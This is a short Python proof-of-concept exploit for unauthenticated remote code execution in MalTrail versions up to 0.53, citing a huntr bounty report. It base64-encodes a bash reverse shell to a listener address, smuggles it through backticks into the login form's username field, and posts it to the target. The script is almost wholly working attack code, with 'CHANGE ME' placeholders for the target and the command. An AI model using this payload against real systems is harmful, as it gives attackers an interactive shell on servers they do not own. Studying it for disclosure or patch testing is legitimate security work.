#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# MalTrail <= v0.53 - Unauthenticated RCE
# By: https://github.com/kazzarahw
# Ref: https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/

# Imports
import requests
import base64

# Config
target_url = "http://127.0.0.1:55555/xvsvmwrjd1qnl0x7an9gv52dp6ok7k9q" # CHANGE ME
cmd = "/bin/bash -i >& /dev/tcp/127.0.0.1/10001 0>&1" # CHANGE ME

# Setup
login_url = f"{target_url}/login"
cmd_enc = base64.b64encode(cmd.encode()).decode()
cmd_cradle = f"echo+{cmd_enc}|base64+-d|bash"
payload = "username=;`" + cmd_cradle + "`"

# Run
response = requests.post(login_url, data=payload)
